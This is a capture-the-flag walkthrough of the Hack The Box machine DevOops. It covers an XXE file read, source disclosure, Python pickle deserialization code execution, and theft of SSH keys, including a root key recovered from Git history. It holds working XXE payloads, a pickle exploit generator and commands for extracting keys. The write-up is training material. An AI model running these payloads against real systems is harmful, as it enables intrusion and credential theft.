---
tags: [HTB, DevOops, Linux, Ubuntu, Gunicorn, Python, Git, XXE, PickleDeserialization, SSHKey, Medium]
platform: HackTheBox
os: Ubuntu 16.04 x86
hostname: devoops
domain: ""
difficulty: Medium
ip: $BoxIP
status: Complete
---

# HTB: DevOops, Full Walkthrough

## The gist

DevOops is a source-review box. A Gunicorn application exposes a multipart XML upload endpoint that resolves external entities, so the first useful step is a safe `/etc/passwd` read. The same XXE reads the Flask source, which exposes an unsafe `pickle.loads()` endpoint. A harmless pickle payload proves command execution, while a second XXE read discloses `roosa`'s SSH key.

The SSH foothold exposes a writable Git repository. Its history contains an older integration key that is still accepted by the root account. The important lesson is to keep enumerating after the first shell: current files are not the only place where credentials can survive.

Attack chain:

~~~text
Full TCP scan -> Gunicorn web service -> multipart XML upload
-> XXE /etc/passwd read -> Flask source disclosure
-> unsafe Python pickle command execution -> XXE SSH-key disclosure
-> SSH as roosa -> Git history secret hunting -> root SSH key
-> root identity proof -> remove recorded XML test files
~~~

> [!warning] Flag and credential boundary
> The private run record contains flag records, private keys, and session material. This note records no flag values, passwords, hashes, or private-key contents.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Ubuntu 16.04 x86 |
| Hostname | devoops |
| Domain | None identified |
| Difficulty | Medium |
| Target | $BoxIP |
| Services | SSH 22, Gunicorn HTTP 5000 |
| Primary route | XXE -> source review -> pickle RCE proof -> SSH key -> Git history key |

## Evidence and loot

The source material is the private run record and loot under `~/Platforms/HackTheBox/DevOops/`, especially `DevOops.log`, the saved Nmap output, the XML payloads, the source response, the pickle generator, and the selected screenshots. Private key responses and flag/session artifacts remain private and are not embedded in the vault.

Safe evidence copied beside this note:

- `devoops-1-nmap-allports.png`: full TCP scan.
- `devoops-2-nmap-services.png`: OpenSSH and Gunicorn version scan.
- `devoops-3-index.png`: the under-construction application page.
- `devoops-4-gobuster-upload.png`: `/upload` and `/feed` discovery.
- `devoops-5-upload-content-page.png`: XML upload form and expected element names.
- `devoops-6-xxe-passwd.png`: reflected `/etc/passwd` proof with interactive users visible.
- `devoops-7-source-newpost.png`: source disclosure of the `/newpost` handler.
- `devoops-8-pickle-rce.png`: harmless pickle command-execution proof.
- `devoops-10-ssh-roosa.png`: SSH foothold as `roosa`.
- `devoops-11-git-log.png`: repository history and the suspicious integration-key commit.

The private SSH-key and flag frames are intentionally not reproduced.

## Variables

Use the helper variables in the normal box workspace. Keep XML payloads, raw responses, extracted keys, and command output under `$BoxDir`.

~~~bash
boxstart "DevOops" "$BoxIP" htb
boxset BoxName "DevOops"
boxset BoxDir "$HOME/Platforms/HackTheBox/DevOops"
boxset WebPort "5000"
boxset Port "4444"
boxset Username "roosa"
boxset SourcePath "/home/$Username/deploy/src/feed.py"
boxset RemoteSrcDir "/home/$Username/deploy/src"
boxset KeyPath "/home/$Username/.ssh/id_rsa"
boxset GitRepo "/home/$Username/work/blogfeed"
boxset Commit "d387abf"
boxset AdminUser "root"
boxset KeyFile "$BoxDir/loot/${Username}_id_rsa"
boxset HistoryKeyFile "$BoxDir/loot/${AdminUser}_history.key"
boxset LocalIP "$(ip addr show tun0 2>/dev/null | awk '/inet / {sub(/\/.*/,\"\",$2); print $2; exit}')"
~~~

## 1. Initialise the workspace and scan every TCP port

Start with every TCP port instead of assuming HTTP is on port 80. The full scan showed only SSH and a non-standard web service, so port 5000 became the primary application target. Save the Nmap output in all three formats so later review can use the human-readable, grep-friendly, or XML result.

~~~bash
sudo nmap -Pn -n -sS -p- --min-rate 5000 --max-retries 2 \\
  --host-timeout 5m -T4 \\
  -oA "$BoxDir/nmap/tcp-all" "$BoxIP"
~~~

The decisive lines were:

| Port | Service | Why it matters |
|---|---|---|
| 22/tcp | SSH | Possible key or credential validation path |
| 5000/tcp | HTTP, initially labelled `upnp` | Non-standard web application requiring direct HTTP checks |

![[devoops-1-nmap-allports.png]]
SCREENSHOT: Full TCP scan. Red marks the two open ports; green marks the complete port range.

## 2. Identify service versions

Run default scripts and version detection only against the ports that survived the full scan. The version output confirmed a Linux target running OpenSSH and Gunicorn, which moved the next step to application enumeration instead of public exploit searching.

~~~bash
boxset OpenPorts "22,5000"
sudo nmap -Pn -n -sC -sV --version-light \\
  -p "$OpenPorts" \\
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

The useful banner details were OpenSSH 7.2p2 and Gunicorn 19.7.1. The Gunicorn banner matters because it identifies a Python web application even though the page itself has no title.

![[devoops-2-nmap-services.png]]
SCREENSHOT: Focused service scan. Red marks SSH and Gunicorn; green marks the version information used to choose Python-aware source review.

## 3. Inspect the web root and discover application paths

Request the root page before fuzzing. The page described itself as an unfinished Blogfeeder application and referenced `/feed`, which is a useful clue that the app has a feed-processing feature. A small Gobuster scan then found `/feed` and `/upload`; the upload route was more valuable because it explicitly accepted XML.

~~~bash
curl -sS -i "http://$BoxIP:$WebPort/" | tee "$BoxDir/loot/index.headers.txt"
curl -sS "http://$BoxIP:$WebPort/" -o "$BoxDir/loot/index.html"
grep -Ein 'feed|upload|xml|api|debug|todo' "$BoxDir/loot/index.html"
gobuster dir -u "http://$BoxIP:$WebPort/" \\
  -w /usr/share/wordlists/dirb/common.txt \\
  -t 20 \\
  -o "$BoxDir/nmap/gobuster.txt"
~~~

The important discovery output was:

~~~text
/feed    (Status: 200) [large image response]
/upload  (Status: 200) [small HTML upload form]
~~~

![[devoops-3-index.png]]
SCREENSHOT: The application root. Red marks the Blogfeeder clue; green marks the `/feed` reference.

![[devoops-4-gobuster-upload.png]]
SCREENSHOT: Gobuster results. Red marks `/upload`; `/feed` is the secondary application route.

## 4. Read the upload form before sending XML

The `/upload` page disclosed the multipart field name and the expected XML elements: `Author`, `Subject`, and `Content`. That is enough to build a controlled request without guessing the parser's input shape. Save the page as loot so the exact form can be reviewed later.

~~~bash
curl -sS "http://$BoxIP:$WebPort/upload" | tee "$BoxDir/loot/upload.txt"
~~~

The form used `multipart/form-data` with a file field named `file`. This is different from posting raw XML directly to an API endpoint, so the payload must be attached with curl's `-F` option.

![[devoops-5-upload-content-page.png]]
SCREENSHOT: `/upload` form. Red marks the `file` multipart field; green marks the XML element names.

## 5. Confirm XXE with a safe `/etc/passwd` read

XML External Entity injection, or XXE, happens when an XML parser resolves attacker-controlled external entities. Start with `/etc/passwd`, a predictable non-secret file, because the usernames and shell paths make a positive result unmistakable. The response reflected the entity inside the `Author` field, proving both entity resolution and the output channel.

Create the payload locally:

~~~bash
cat > "$BoxDir/exploits/xxe-passwd.xml" <<'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<feed>
  <Author>&xxe;</Author>
  <Subject>DevOops XXE validation</Subject>
  <Content>safe file-read proof</Content>
</feed>
EOF
~~~

Upload it using the exact multipart field discovered in the form:

~~~bash
curl -sS \\
  -F "file=@$BoxDir/exploits/xxe-passwd.xml;filename=feed.xml" \\
  "http://$BoxIP:$WebPort/upload" | tee "$BoxDir/loot/xxe-passwd.txt"
~~~

Focus on the reflected `Author` content. The result exposed interactive accounts including `git`, `roosa`, and `blogfeed`. That gave a candidate home-directory path for source and SSH-key reads.

![[devoops-6-xxe-passwd.png]]
SCREENSHOT: Reflected `/etc/passwd` contents. Red marks the discovered interactive usernames; green marks the successful entity expansion.

> [!warning] 💡 Gotcha
> Do not begin with a private key. A safe file read proves the parser behavior first and makes a later key-extraction failure easier to diagnose.

## 6. Use XXE to read the Flask source

Once XXE is confirmed, read the application source rather than guessing endpoint names or request formats. The source response showed that `/newpost` base64-decodes the raw request body and passes it directly to `pickle.loads()`. Python pickle is a serialization format, but untrusted pickle data is executable during deserialization.

Build a second payload using the source path and save the response:

~~~bash
cat > "$BoxDir/exploits/xxe-feedpy.xml" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file://$SourcePath">
]>
<feed>
  <Author>&xxe;</Author>
  <Subject>source review</Subject>
  <Content>source disclosure</Content>
</feed>
EOF

curl -sS \\
  -F "file=@$BoxDir/exploits/xxe-feedpy.xml;filename=feed.xml" \\
  "http://$BoxIP:$WebPort/upload" | tee "$BoxDir/loot/feed-source.txt"

grep -nE 'newpost|base64|pickle|loads' "$BoxDir/loot/feed-source.txt"
~~~

The vulnerable source pattern was:

~~~python
picklestr = base64.urlsafe_b64decode(request.data)
postObj = pickle.loads(picklestr)
return "POST RECEIVED: " + postObj['Subject']
~~~

![[devoops-7-source-newpost.png]]
SCREENSHOT: Source disclosure. Red marks `pickle.loads()`; green marks the base64 decoding and the reflected `Subject` field.

## 7. Prove Python pickle command execution safely

The `__reduce__` method tells pickle how to rebuild an object. Returning Python's `eval` with an expression that calls `os.popen()` makes the server execute a command while loading the object. Use `id` first, not a callback, so the response itself proves the execution identity.

Create a small protocol-2 payload generator. Protocol 2 is compatible with the target's older Python environment, while URL-safe base64 matches the application's `urlsafe_b64decode()` call.

~~~bash
cat > "$BoxDir/exploits/mkpickle.py" <<'PY'
#!/usr/bin/env python3
import base64
import pickle
import sys

class Exploit:
    def __reduce__(self):
        command = sys.argv[1]
        expression = "{'Subject': __import__('os').popen(%r).read()}" % command
        return (eval, (expression,))

if len(sys.argv) != 2:
    raise SystemExit("usage: mkpickle.py COMMAND")

payload = pickle.dumps(Exploit(), protocol=2)
print(base64.urlsafe_b64encode(payload).decode())
PY

Payload="$(python3 "$BoxDir/exploits/mkpickle.py" id)"
curl -sS -X POST \\
  --data-binary "$Payload" \\
  -H 'Content-Type: application/octet-stream' \\
  "http://$BoxIP:$WebPort/newpost" | tee "$BoxDir/loot/pickle-id.txt"
~~~

The response returned an identity line for `roosa`, confirming server-side command execution. At this point a reverse-shell callback was not required. A callback request hung because target egress was not reliable, so the web response was kept as the proof channel and the SSH-key path was used for a stable shell.

![[devoops-8-pickle-rce.png]]
SCREENSHOT: Pickle execution proof. Red marks the returned identity; green marks the `/newpost` request.

> [!warning] 💡 Gotcha
> A pickle payload is not just data. Treat `pickle.loads()` as an RCE sink and prove it with a harmless command before changing the output channel.

## 8. Use XXE to disclose the `roosa` SSH key

The user list identified `roosa` as an interactive account, and the application process could read that user's SSH directory. Read the key through the same reflected `Author` field, but save the complete HTTP response to disk. Never retype a wrapped private key from a browser or terminal.

~~~bash
cat > "$BoxDir/exploits/xxe-sshkey.xml" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE feed [
  <!ENTITY xxe SYSTEM "file://$KeyPath">
]>
<feed>
  <Author>&xxe;</Author>
  <Subject>key disclosure</Subject>
  <Content>private response saved locally</Content>
</feed>
EOF

curl -sS \\
  -F "file=@$BoxDir/exploits/xxe-sshkey.xml;filename=key.xml" \\
  "http://$BoxIP:$WebPort/upload" | tee "$BoxDir/loot/xxe-key.txt"

awk 'index($0,"Author: "){sub(/^.*Author: /,""); inkey=1} /^ Subject:/{inkey=0} inkey{print}' \\
  "$BoxDir/loot/xxe-key.txt" > "$KeyFile"
chmod 600 "$KeyFile"
ssh-keygen -y -f "$KeyFile" > /dev/null
~~~

`ssh-keygen -y` derives a public key from the private key and is a low-impact integrity check. A successful check means the extraction preserved the complete PEM block. The key content remains in private loot and is not shown here.

## 9. Open SSH as `roosa`

Use the validated key once, with `IdentitiesOnly` so the client does not offer unrelated keys from the workstation. The SSH banner identified the host as `devoops`; the shell identity confirmed the foothold account and its groups.

~~~bash
ssh -o IdentitiesOnly=yes -i "$KeyFile" "$Username@$BoxIP"
~~~

Immediately record the shell context:

~~~bash
id
whoami
hostname
pwd
~~~

![[devoops-10-ssh-roosa.png]]
SCREENSHOT: SSH foothold as `roosa`. Red marks the shell identity; green marks the host name.

## 10. Enumerate the user and inspect the repository

The first local checks distinguish a direct sudo path from a credential or source-control path. `sudo -n -l` avoids waiting for a password prompt and showed that a password was required, so unrestricted sudo was not the route. The home directory then exposed `work/blogfeed/.git`, which made Git history a high-value credential source.

~~~bash
whoami
id
hostname
sudo -n -l 2>&1 || true
find "$HOME/work/blogfeed" -maxdepth 3 -type f -o -type d | sort
git -C "$HOME/work/blogfeed" log --oneline --all
~~~

The history contained normal application commits plus an older commit describing an integration key. The working tree alone was not enough; `git log --all` was the decision point that led to historical source review.

![[devoops-11-git-log.png]]
SCREENSHOT: Git history. Red marks the integration-key commit; green marks the repository path and commit sequence.

## 11. Recover the historical integration key

Git commits are immutable snapshots. Removing a credential from the current tree does not remove it from earlier commits, so use `git show` with the exact path recorded in the commit. Run the command through the existing SSH session and redirect the key to private Kali loot instead of printing it.

~~~bash
ssh -o IdentitiesOnly=yes -i "$KeyFile" "$Username@$BoxIP" \\
  "git -C '$GitRepo' show '$Commit:resources/integration/authcredentials.key'" \\
  > "$HistoryKeyFile"
chmod 600 "$HistoryKeyFile"
ssh-keygen -y -f "$HistoryKeyFile" > /dev/null
~~~

The historical key was accepted by the root account. Validate the execution context with identity and hostname checks only:

~~~bash
ssh -o IdentitiesOnly=yes -i "$HistoryKeyFile" "$AdminUser@$BoxIP" \\
  'id && whoami && hostname && pwd' | tee "$BoxDir/loot/root-proof.txt"
~~~

The result confirmed UID 0, account `root`, host `devoops`, and the root home directory. No flag value is reproduced.

## 12. Clean the target-side XML test files

The XML uploads were test artifacts. Remove only filenames created during this run, leave the application source and Git repository unchanged, and verify that the recorded paths are gone. Keep the extracted keys in private local loot as evidence rather than deleting them from the case folder.

~~~bash
ssh -o IdentitiesOnly=yes -i "$KeyFile" "$Username@$BoxIP" \\
  "rm -f '$RemoteSrcDir/feed.xml' '$RemoteSrcDir/app.xml' '$RemoteSrcDir/feed-source.xml' '$RemoteSrcDir/key.xml' '$RemoteSrcDir/roosa-key.xml'"

ssh -o IdentitiesOnly=yes -i "$KeyFile" "$Username@$BoxIP" \\
  "find '$RemoteSrcDir' -maxdepth 1 -type f \\
   \( -name 'feed.xml' -o -name 'app.xml' -o -name 'feed-source.xml' \\
   -o -name 'key.xml' -o -name 'roosa-key.xml' \) -print"

boxdone
~~~

The private log recorded the target cleanup verification and box closeout. No target-side persistence was required.

## RUNBOOK V2 Stages Used

| Stage | How DevOops used it |
|---|---|
| [[OSCP/RUNBOOK V2/Start Here|Start Here]] | Workspace variables and full TCP scan |
| [[OSCP/RUNBOOK V2/Port Triage|Port Triage]] | SSH plus non-standard HTTP routed to Linux web enumeration |
| [[OSCP/RUNBOOK V2/Linux - Service Scan|Linux - Service Scan]] | OpenSSH and Gunicorn version identification |
| [[OSCP/RUNBOOK V2/Linux - Web Enum|Linux - Web Enum]] | Root-page review, Gobuster, and multipart upload discovery |
| [[OSCP/RUNBOOK V2/Linux - XXE|Linux - XXE]] | Reflected XML entity expansion and file reads |
| [[OSCP/RUNBOOK V2/Linux - Python Pickle|Linux - Python Pickle]] | Source-driven unsafe deserialization and safe `id` proof |
| [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]] | SSH-key extraction and Git-history credential hunting |
| [[OSCP/RUNBOOK V2/Linux - Local Enum|Linux - Local Enum]] | Identity, sudo, home-directory, and repository checks |
| [[OSCP/RUNBOOK V2/Linux - Clean Down|Linux - Clean Down]] | Removal and verification of recorded XML test files |

## Decision points

| Observation | Decision |
|---|---|
| Port 5000 returned Gunicorn | Treat it as a Python web application and inspect the root page and source clues |
| `/upload` accepted XML and reflected `Author` | Test XXE with `/etc/passwd` before reading higher-value files |
| Source contained `pickle.loads(base64.urlsafe_b64decode(request.data))` | Build a protocol-2 pickle payload and prove execution with `id` |
| HTTP callback delivery was unreliable | Keep command output in the response and use the disclosed SSH key for a stable shell |
| `roosa` had a `.git` repository with an integration-key commit | Inspect the historical snapshot instead of trusting only the current working tree |
| Historical key authenticated as root | Stop escalation, capture identity proof, and clean the recorded XML files |

## Attack Chain

1. Full TCP scanning found SSH and Gunicorn HTTP on port 5000.
2. Web enumeration found `/upload`, which disclosed the multipart field and XML element names.
3. XXE read `/etc/passwd` and exposed the interactive account names.
4. XXE read the Flask source and exposed the unsafe `/newpost` pickle loader.
5. A safe pickle payload executed `id` and returned the service identity.
6. XXE disclosed `roosa`'s SSH private key, which was extracted mechanically and validated locally.
7. SSH access as `roosa` exposed a Git repository and its commit history.
8. An older integration-key commit yielded a second private key that authenticated as root.
9. Root identity was verified without recording any flag value.
10. Recorded XML upload artifacts were removed from the target.

## Credentials

| Account or context | Source | Use |
|---|---|---|
| `roosa` | XXE read of `/home/$Username/.ssh/id_rsa` | SSH foothold and Git-history review |
| `root` | Historical Git snapshot under `resources/integration/` | Final SSH validation |

No password, hash, private-key content, or session token is reproduced.

## Flags

- `user.txt`: `$UserFlag` (value intentionally omitted)
- `root.txt`: `$RootFlag` (value intentionally omitted)
- `proof.txt`: `$ProofFlag` (value intentionally omitted)

## Key lessons

- A multipart XML upload is still an XML parser attack surface. Read the form first, then confirm XXE with a safe file.
- Source disclosure is often more valuable than blind endpoint fuzzing. It exposed both the exact request format and the unsafe deserialization sink.
- Treat Python `pickle.loads()` on attacker-controlled data as code execution. Prove it with `id` before attempting a shell.
- Extract multi-line secrets mechanically and validate them with `ssh-keygen -y`; do not copy private keys from terminal wrapping.
- `git log --all` is part of credential hunting. A removed key may remain usable in an earlier commit.
- If a callback path is unreliable, preserve the working response channel and choose the stable access path already disclosed by the application.

## Related Boxes

- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]]: reflected XXE file read to SSH-key foothold on Windows.
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]]: source/config review to SSH-key recovery and local escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]]: web file disclosure, mechanical secret decoding, and SSH validation.
- [[OSCP/BOXES/WRITE UPS/Linux/CronOS|CronOS]]: source-aware web enumeration followed by a Linux privilege path.

## External Resources

- [PortSwigger: XML external entity injection](https://portswigger.net/web-security/xxe)
- [Python documentation: pickle security](https://docs.python.org/3/library/pickle.html)
- [Git documentation: git-log](https://git-scm.com/docs/git-log)
- [Git documentation: git-show](https://git-scm.com/docs/git-show)
- [OpenBSD ssh-keygen manual](https://man.openbsd.org/ssh-keygen)
- [HackTricks: XXE](https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html)

## Checklist

- [x] Workspace variables recorded
- [x] Full TCP scan saved
- [x] Focused service scan saved
- [x] Root page and content discovery completed
- [x] Multipart XML upload identified
- [x] XXE confirmed with `/etc/passwd`
- [x] Flask source disclosed and reviewed
- [x] Python pickle command execution verified with `id`
- [x] `roosa` SSH key extracted and validated privately
- [x] SSH foothold confirmed
- [x] Git history reviewed for deleted credentials
- [x] Historical root key validated privately
- [x] Root identity verified without reproducing flags
- [x] Recorded XML test files removed from the target
- [x] Write-up, runbook links, command hubs, and master tracking updated
